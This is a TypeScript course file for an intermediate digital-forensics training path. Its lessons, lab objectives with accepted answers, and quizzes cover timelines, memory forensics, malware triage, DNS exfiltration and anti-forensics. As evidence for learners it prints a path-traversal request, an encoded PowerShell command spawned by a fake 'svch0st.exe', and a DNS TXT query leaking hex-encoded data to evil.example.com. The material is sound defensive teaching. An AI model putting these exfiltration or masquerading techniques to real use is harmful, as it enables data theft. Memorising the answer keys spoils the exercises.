import { Path } from "../types";

export const intermediateForensics: Path = {
  id: "intermediate-forensics",
  title: "Intermediate — Digital Forensics",
  level: "Intermediate",
  track: "Forensics",
  tagline: "Timelines, memory, malware triage — think like an investigator.",
  modules: [
    {
      id: "timelines",
      title: "Timelines",
      minutes: 20,
      outcomes: [
        "Explain why timeline analysis is the backbone of investigations",
        "Correlate timestamps across different evidence sources",
        "Build a simple incident timeline",
      ],
      lesson: `## Time is the skeleton of every case

Single clues lie. **Timelines don't.** When you line up every event in time order — log entries, file dates, photo metadata — the story assembles itself: *first this, then that, therefore this.*

## Correlating sources

You have two timestamped sources already:

- \`evidence/access.log\` — the attacker's requests, timestamped to the second: first seen at \`09:14:55\`, probing \`/admin\`, then \`POST /login\`, then the \`/../../etc/passwd\` attempt.
- \`evidence/photo.jpg\` — EXIF says taken \`2026-03-14 18:22:09\`, same day, hours later.

Two sources, one day. Which came first? That's **correlation**: placing events from different evidence on one shared timeline. Investigators do this with dozens of sources — logs, registry, file times, messages — until the sequence is undeniable.

## Building yours

Read the log with \`cat evidence/access.log\`, read the EXIF with \`exiftool evidence/photo.jpg\`, and answer: when did the attacker first appear, when was the photo taken, and which came first? Then write the timeline as a note. Order is everything.`,
      labIntro: "Correlate the log timestamps with the photo's EXIF date. Build the timeline.",
      labKind: "terminal",
      objectives: [
        { id: "o1", text: "What time did the attacker first appear in the log? (HH:MM:SS)", check: { kind: "answer", answers: ["09:14:55"], hint: "cat evidence/access.log — first 203.0.113.77 line." } },
        { id: "o2", text: "What date was the photo taken? (YYYY-MM-DD)", check: { kind: "answer", answers: ["2026-03-14", "14 mar 2026", "14/03/2026"], hint: "exiftool evidence/photo.jpg — Date Taken." } },
        { id: "o3", text: "Which came first — the log attack or the photo?", check: { kind: "answer", answers: ["the attack", "attack", "the log attack", "log", "the log"], hint: "Compare 09:14 with 18:22 on the same day." } },
      ],
      quiz: [
        { q: "Why is timeline analysis so powerful?", options: ["It looks nice", "Ordered events reveal cause and effect", "It's fast", "It's required"], answer: 1, explain: "Sequence turns clues into a story." },
        { q: "What does 'correlating sources' mean?", options: ["Deleting sources", "Placing events from different evidence on one timeline", "Copying files", "Encrypting logs"], answer: 1, explain: "One timeline, many witnesses." },
        { q: "The attacker struck at 09:14, the photo was taken at 18:22 — so…", options: ["The photo came first", "The attack came first", "They're unrelated", "Time is fake"], answer: 1, explain: "Same day, earlier hour = first." },
        { q: "Timestamps must be…", options: ["Ignored", "Normalized to one timezone before comparing", "Deleted", "Guessed"], answer: 1, explain: "Mixed timezones create false sequences." },
      ],
    },
    {
      id: "memory-forensics",
      title: "Memory Forensics Concepts",
      minutes: 20,
      outcomes: [
        "Read a process list like an investigator",
        "Spot masquerading malware (svch0st vs svchost)",
        "Recognize encoded PowerShell as a red flag",
      ],
      lesson: `## RAM never lies (much)

Disk can be wiped; **memory** shows what's *running right now*. Memory forensics examines process lists, network connections, and injected code. Our \`evidence/memdump.txt\` is a simplified process listing — real tools (Volatility) produce the same shape.

\`\`\`
cat evidence/memdump.txt
\`\`\`

## Spot the imposter

Read the NAME column. See \`svchost.exe\` twice — normal Windows processes. Then: \`svch0st.exe\`. **Zero, not the letter 'o'.** Malware **masquerades** as legitimate process names, betting you won't look closely. Its PID is 3133, child of explorer — and look what it spawned:

\`\`\`
powershell.exe -enc aQBmACgAWwBJAG8ALgBGAGkAbABlAF0A
\`\`\`

\`-enc\` means **base64-encoded command** — the classic way malware hides what PowerShell is really doing. Legit admin scripts rarely need to hide.

## The investigator's eye

Two skills, one habit: **read carefully, trust nothing**. Check parent-child relationships (why is PowerShell a child of a fake svchost?), check names letter by letter. Findings: the imposter's name, its PID, and its suspicious child.`,
      labIntro: "Examine the memory dump. Something is pretending to be something it isn't.",
      labKind: "terminal",
      objectives: [
        { id: "o1", text: "Which process name is misspelled (imposter)?", check: { kind: "answer", answers: ["svch0st.exe", "svch0st"], hint: "cat evidence/memdump.txt — look letter by letter." } },
        { id: "o2", text: "What is the imposter's PID?", check: { kind: "answer", answers: ["3133"], hint: "First column of the imposter's row." } },
        { id: "o3", text: "What suspicious child process did it spawn?", check: { kind: "answer", answers: ["powershell.exe", "powershell"], hint: "Check the PPID column — who is 3133's child?" } },
      ],
      quiz: [
        { q: "Why is memory forensics valuable?", options: ["It's fast", "It shows what's running now — things disk analysis misses", "It's easy", "It needs no tools"], answer: 1, explain: "Running malware lives in RAM." },
        { q: "What is process masquerading?", options: ["A costume party", "Malware using a near-identical name to a legit process", "A firewall", "Encryption"], answer: 1, explain: "svch0st vs svchost — one character of deception." },
        { q: "powershell.exe -enc <base64> suggests…", options: ["Normal admin work", "Someone hiding what the command does", "A Windows update", "Nothing"], answer: 1, explain: "Encoded commands are a classic malware red flag." },
        { q: "Why check parent-child process relationships?", options: ["Fun", "Weird parents (e.g. fake svchost spawning PowerShell) reveal malware", "It's required", "No reason"], answer: 1, explain: "Legit processes have legit parents." },
      ],
    },
    {
      id: "malware-triage",
      title: "Malware Triage",
      minutes: 20,
      outcomes: [
        "Perform static triage: type, strings, and first impressions",
        "Explain the static vs dynamic analysis trade-off",
        "Decide handling precautions for a suspect binary",
      ],
      lesson: `## First contact with malware

**Triage** is the quick first look that decides: *is this malicious, and how dangerous?* You never run it first — you **statically** analyze: examine without executing.

## The static triage flow

1. **Identify**: \`file evidence/mystery.bin\` → ELF 64-bit executable. Know what you're holding.
2. **Strings**: \`strings evidence/mystery.bin\` → prompts, and… a hardcoded password. Legit software rarely embeds \`password=Sup3rS3cret!\`.
3. **First impression**: login prompts + embedded credential + access granted/denied logic = looks like a **backdoor or credential stealer**.

## Static vs dynamic

- **Static** (what you did): safe, fast, but misses packed/encrypted behavior.
- **Dynamic**: run it in an isolated **sandbox** VM and watch what it does — powerful, but one mistake infects you.

Golden rule: **never run suspect binaries on your real machine**. Triage statically, detonate only in disposable sandboxes. Your verdict: architecture, the embedded secret, and your one-word assessment of what this thing is.`,
      labIntro: "Triage the suspect binary statically. Look, don't touch.",
      labKind: "terminal",
      objectives: [
        { id: "o1", text: "What CPU architecture is the binary built for?", check: { kind: "answer", answers: ["x86-64", "x86_64", "64-bit", "x86 64"], hint: "file evidence/mystery.bin" } },
        { id: "o2", text: "What hardcoded credential did strings reveal?", check: { kind: "answer", answers: ["sup3rs3cret!", "password=sup3rs3cret!"], hint: "strings evidence/mystery.bin" } },
        { id: "o3", text: "In one word: what does this binary look like?", check: { kind: "answer", answers: ["backdoor", "malware", "trojan", "stealer"], hint: "Login prompts + hidden password = ?" } },
      ],
      quiz: [
        { q: "What is static analysis?", options: ["Running the malware", "Examining it without executing", "Deleting it", "Ignoring it"], answer: 1, explain: "Look, don't touch — first." },
        { q: "What is dynamic analysis?", options: ["Reading code", "Running it in an isolated sandbox and observing", "Guessing", "Static analysis"], answer: 1, explain: "Watch behavior — but only in a disposable sandbox." },
        { q: "The hardcoded password suggests…", options: ["Good coding", "A backdoor or lazy credential handling", "Encryption", "Nothing"], answer: 1, explain: "Embedded secrets are a malware hallmark." },
        { q: "First rule when handling suspect binaries?", options: ["Run it to see", "Never execute on your real machine", "Email it around", "Delete immediately"], answer: 1, explain: "Sandbox or nothing." },
      ],
    },
    {
      id: "network-forensics",
      title: "Network Forensics",
      minutes: 20,
      outcomes: [
        "Explain DNS exfiltration in plain words",
        "Spot TXT queries carrying hidden data",
        "Decode hex-encoded stolen data",
      ],
      lesson: `## Smuggling data in questions

DNS is rarely blocked — every network needs it. Attackers abuse that trust with **DNS exfiltration**: they encode stolen data into DNS *queries*, usually as long subdomains of a domain they control.

Open the **dns-exfil** capture. Most traffic is innocent (\`www.example.com\`, \`mail.example.com\`). Then:

\`\`\`
Standard query TXT 4a6f686e446f65313233.evil.example.com
\`\`\`

**TXT** records aren't for browsing — they're for arbitrary text. And \`4a6f686e446f65313233\` isn't a hostname, it's **hex**. Decode it (each pair = one ASCII character): \`4a\`='J', \`6f\`='o'… it spells a username. The attacker is drip-feeding stolen records out through DNS, one query at a time.

## The investigator's proof

Name the compromised host, name the attacker's domain, and decode the labels. Three TXT queries carry three pieces of one stolen record — reassemble them and you've proven exfiltration, not just suspected it.`,
      labIntro: "Open the dns-exfil capture. Data is leaving inside DNS queries — prove it.",
      labKind: "packets",
      captureId: "dns-exfil",
      objectives: [
        { id: "o1", text: "Which internal host is exfiltrating data?", check: { kind: "answer", answers: ["192.168.56.40"], hint: "Who asks about evil.example.com?" } },
        { id: "o2", text: "Which domain receives the stolen data?", check: { kind: "answer", answers: ["evil.example.com"], hint: "The suspicious domain in the queries." } },
        { id: "o3", text: "Decode the first hex label: 4a6f686e446f65313233", check: { kind: "answer", answers: ["johndoe123"], hint: "Hex pairs → ASCII: 4a=J, 6f=o, …" } },
      ],
      quiz: [
        { q: "What is DNS exfiltration?", options: ["Blocking DNS", "Smuggling stolen data out inside DNS queries", "A DNS server bug", "Faster DNS"], answer: 1, explain: "Data hides in subdomains of an attacker domain." },
        { q: "Why do attackers love DNS for this?", options: ["It's fast", "DNS is rarely blocked — networks need it", "It's encrypted", "It's new"], answer: 1, explain: "Firewalls must allow DNS, so it blends in." },
        { q: "Why use TXT queries?", options: ["They're faster", "TXT records can carry arbitrary text", "They're required", "No reason"], answer: 1, explain: "TXT is designed for free-form text — perfect for smuggling." },
        { q: "The first decoded label was…", options: ["password", "JohnDoe123", "hello", "admin"], answer: 1, explain: "4a6f686e446f65313233 decodes to JohnDoe123." },
      ],
    },
    {
      id: "anti-forensics",
      title: "Anti-Forensics Awareness",
      minutes: 15,
      outcomes: [
        "Define timestomping and log wiping",
        "Explain anti-forensics from a defender's view",
        "Recommend defenses that preserve evidence",
      ],
      lesson: `## The criminal's counter-game

Skilled attackers fight back against investigators with **anti-forensics**:

- **Timestomping**: changing file timestamps to fake an alibi — "this malware was here before the breach."
- **Log wiping**: deleting or editing logs (like the \`access.log\` you read) to erase footprints.
- **Data hiding**: the steganography you carved in the beginner path — but used *against* you.

## Think like a defender

You learn this not to use it, but to **defeat** it:

1. **Remote logging**: ship logs to a separate server in real time — attackers can't wipe what isn't there.
2. **Immutable storage**: write-once backups for critical evidence.
3. **Corroboration**: one wiped log is suspicious; *five* agreeing sources are hard to fake — which is why timelines matter.

## Your exercise

Re-open \`evidence/access.log\`. Imagine the attacker deleted their four hostile lines. What would remain? How would you *still* know something happened? (Hint: gaps, 404s in other logs, the login POST with no matching session.) Write one defense you'd deploy as a note — then defend it in the quiz.`,
      labIntro: "Learn how attackers fight investigators — so you can beat them at it.",
      labKind: "terminal",
      objectives: [
        { id: "o1", text: "In your words: what is timestomping?", check: { kind: "answer", answers: ["changing file timestamps", "altering timestamps", "modifying file timestamps", "faking timestamps", "changing timestamps"], hint: "Fake the 'when' of a file." } },
        { id: "o2", text: "Why would an attacker wipe logs?", check: { kind: "answer", answers: ["hide their tracks", "cover their tracks", "hide", "avoid detection", "erase evidence"], hint: "What do logs contain that they fear?" } },
        { id: "o3", text: "Note one defense that keeps logs safe from tampering", check: { kind: "flag", flag: "notes_used", hint: "notes add <your defense>" } },
      ],
      quiz: [
        { q: "What is timestomping?", options: ["A dance", "Altering file timestamps to fake an alibi", "Deleting files", "A backup tool"], answer: 1, explain: "Fake times mislead timeline analysis." },
        { q: "Best defense against log wiping?", options: ["Bigger disks", "Real-time remote logging to a separate server", "No logs at all", "Hope"], answer: 1, explain: "Attackers can't wipe logs that left the building." },
        { q: "Why study anti-forensics as a defender?", options: ["To use it", "To recognize and defeat it", "For fun", "It's required"], answer: 1, explain: "Know the trick to catch the trick." },
        { q: "One wiped log vs five agreeing sources:", options: ["Trust the wiped one", "Corroboration across sources beats any single tampered source", "Give up", "They're equal"], answer: 1, explain: "Faking everything consistently is nearly impossible." },
      ],
    },
    {
      id: "full-case",
      title: "Full Case — End to End",
      minutes: 30,
      outcomes: [
        "Run a complete investigation: triage → timeline → findings",
        "Correlate all four evidence sources",
        "Write defensible, professional findings",
      ],
      lesson: `## Everything you know, one case

This is your capstone. All four evidence files. No walkthrough. A client (fictional) asks: *"Were we breached? What happened?"* Your answer must be factual, ordered, and defensible.

## The investigation flow

1. **Triage**: re-examine each file. \`file\`, \`strings\`, \`exiftool\`, \`carve\`, \`cat\` — note what's new now that you're experienced.
2. **Timeline**: one shared sequence across all sources. Log attack at 09:14–09:15, photo at 18:22, plus what the binary and memory tell you.
3. **Findings**: facts only, each with its evidence ("per access.log line 3…").
4. **Assessment**: what you can prove, what you *can't* (honesty about gaps is professional).
5. **Recommendations**: three concrete fixes, prioritized.

## The standard

A junior analyst who can do this — methodically, in writing — is employable. Take your time. Re-read lessons if needed. **Completing this module earns your certificate: Intermediate — Digital Forensics.**`,
      labIntro: "One case, four evidence files, no walkthrough. Investigate and report.",
      labKind: "mixed",
      objectives: [
        { id: "o1", text: "Re-triage all 4 evidence files and note anything new", check: { kind: "manual", hint: "You're faster now — what did you miss the first time?" } },
        { id: "o2", text: "Build one timeline across all sources", check: { kind: "manual", hint: "Log times + EXIF date + file findings, in order." } },
        { id: "o3", text: "Write findings: facts with evidence cited", check: { kind: "manual", hint: "notes add <finding> — cite the source each time." } },
        { id: "o4", text: "Write 3 prioritized recommendations", check: { kind: "manual", hint: "Concrete fixes, most important first." } },
      ],
      quiz: [
        { q: "First step of the investigation flow?", options: ["Write recommendations", "Triage each evidence source", "Guess the attacker", "Delete logs"], answer: 1, explain: "Understand the evidence before concluding." },
        { q: "A professional finding includes…", options: ["Feelings", "The fact plus its evidence source", "Blame", "Jokes"], answer: 1, explain: "'Per access.log line 3…' — always cited." },
        { q: "Why state what you CAN'T prove?", options: ["Weakness", "Honesty about gaps is professional and builds trust", "Fills space", "No reason"], answer: 1, explain: "Clients respect known unknowns over false certainty." },
        { q: "Recommendations should be…", options: ["Vague", "Concrete, prioritized, actionable", "Long", "Blaming"], answer: 1, explain: "Fix-first ordering gets things fixed." },
      ],
    },
  ],
};
